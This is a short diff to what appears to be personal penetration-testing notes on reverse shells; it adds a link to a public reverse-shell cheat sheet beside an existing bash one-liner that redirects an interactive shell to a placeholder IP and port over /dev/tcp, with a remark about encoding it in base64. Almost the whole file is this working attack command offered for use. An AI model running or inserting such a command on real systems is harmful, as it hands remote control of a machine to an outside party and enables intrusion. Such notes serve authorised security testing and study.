@@ -1,5 +1,7 @@
 Reverse-Shell
 
+Reverse Shell Cheat : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
 #Reverse Shell that I use (Convert to base64)
 bash -i >& /dev/tcp/<ip>/<port> 0>&1
 
